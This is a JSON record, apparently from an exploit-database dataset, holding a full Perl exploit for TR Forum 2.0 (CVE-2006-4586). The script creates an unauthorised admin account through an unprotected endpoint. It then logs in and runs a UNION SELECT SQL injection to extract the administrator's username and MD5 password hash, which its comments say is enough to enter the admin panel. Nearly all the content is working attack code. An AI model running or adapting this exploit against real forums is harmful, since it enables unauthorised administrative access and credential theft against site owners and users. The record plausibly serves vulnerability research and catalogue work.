{
  "id": "2297",
  "title": "TR Forum 2.0 - SQL Injection / Bypass Security Restriction",
  "cve": "CVE-2006-4586",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n# Affected.scr..: Tr Forum V2.0\r\n# Poc.ID........: 10060903\r\n# Type..........: SQL Injection, Bypass Security Restriction\r\n# Risk.level....: Medium\r\n# Vendor.Status.: Unpatched\r\n# Src.download..: comscripts.com/scripts/php.tr-forum.1579.html\r\n# Poc.link......: acid-root.new.fr/poc/10060903.txt\r\n# Credits.......: DarkFig\r\n#\r\n# /membres/modif_profil.php => Profil modification (you can choose the id of the member)\r\n# /membres/change_mdp.php   => Password modification ( same... )\r\n# /admin/insert_admin.php   => Second admin (only del post)\r\n# /admin/editer.php         => SQL Injection without quote\r\n#\r\n# You don't need to crack passwd hashes (for the admin panel)...\r\n# Go to the admin panel (/admin/), enter the username and the hash (not the passwd)... bad security =(\r\n# This exploit is FOR EDUCATIONAL PURPOSE ONLY x 999\r\n#\r\nuse LWP::UserAgent;\r\nuse HTTP::Cookies;\r\nuse HTTP::Request::Common \"POST\";\r\nuse HTTP::Response;\r\nuse Getopt::Long;\r\nuse strict;\r\n\r\nprint STDOUT \"\\n+\", '-' x 53, \"+\\n\";\r\nprint STDOUT \"|    Tr Forum V2.0 Admin MD5 Passwd Hash Disclosure   |\\n\";\r\nprint STDOUT '+', '-' x 53, \"+\\n\";\r\n\r\nmy($host,$path,$proxh,$proxu,$proxp);\r\nmy $opt = GetOptions(\r\n   'host=s'   =>  \\$host,\r\n   'path=s'   =>  \\$path,\r\n   'proxh=s'  =>  \\$proxh,\r\n   'proxu=s'  =>  \\$proxu,\r\n   'proxp=s'  =>  \\$proxp);\r\n\r\nif(!$host) {\r\n    print STDOUT \"| Usage: ./xx.pl --host=[www] --path=[/] [Options]    |\\n\";\r\n    print STDOUT \"| [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd] |\\n\";\r\n    print STDOUT '+', '-' x 53, \"+\\n\";\r\n    exit(0);\r\n}\r\n\r\nif($host  !~ /http/) {$host = 'http://'.$host;}\r\nif($proxh !~ /http/ && $proxh != '') {$proxh = 'http://'.$proxh.'/';}\r\nif(!$path) {$path = '/';}\r\n\r\nprint STDOUT \" [!]Host..: $host\\n\";\r\nprint STDOUT \" [!]Path..: $path\\n\";\r\nprint STDOUT \" [~]Admin user...\\n\";\r\nsleep(1);\r\n\r\nmy $cc = HTTP::Cookies->new();\r\nmy $ua = LWP::UserAgent->new();\r\n   $ua->cookie_jar($cc);\r\n   $ua->agent('0xzilla');\r\n   $ua->timeout(30);\r\n   $ua->proxy(['http'] => $proxh) if $proxh;\r\n\r\nmy $re = POST $host.$path.'/admin/insert_admin.php',[\r\n         'login'    => 'AcidSploitWasHere',\r\n         'password' => 'psychopasswd',\r\n         'mail'     => 'nospam@bot.com',\r\n         ];\r\n   $re->proxy_authorization_basic($proxu, $proxp) if $proxp;\r\n   $ua->request($re);\r\n\r\nprint STDOUT \" [+]User..: AcidSploitWasHere\\n\";\r\nprint STDOUT \" [+]Pass..: psychopasswd\\n\";\r\nprint STDOUT \" [!]Rights: 2 (medium)\\n\";\r\nprint STDOUT \" [~]Collecting admin's hash/username...\\n\";\r\nsleep(1);\r\n\r\nmy $re = POST $host.$path.'index.php',[\r\n         'login'   => 'AcidSploitWasHere',\r\n         'pwd'     => 'psychopasswd',\r\n        ];\r\n   $ua->request($re);\r\n\r\nmy $re = $ua->get($host.$path.'admin/editer.php?id2=-1 UNION SELECT pass,pseudo,0 FROM tr_user_forum');\r\n\r\nif($re->content =~ /\">([a-z0-9]{32})<\\/font>/) {\r\n                print STDOUT \"\\n \".$1.'::';}\r\n\r\nif($re->content =~ /;\">(.*?)<\\/textarea>/) {\r\n                print STDOUT $1.' (root)';}\r\n\r\nprint STDOUT \"\\n+\", '-' x 53, \"+\\n\";\r\nexit(0);\r\n\r\n# milw0rm.com [2006-09-04]",
  "url": "https://www.exploit-db.com/exploits/2297"
}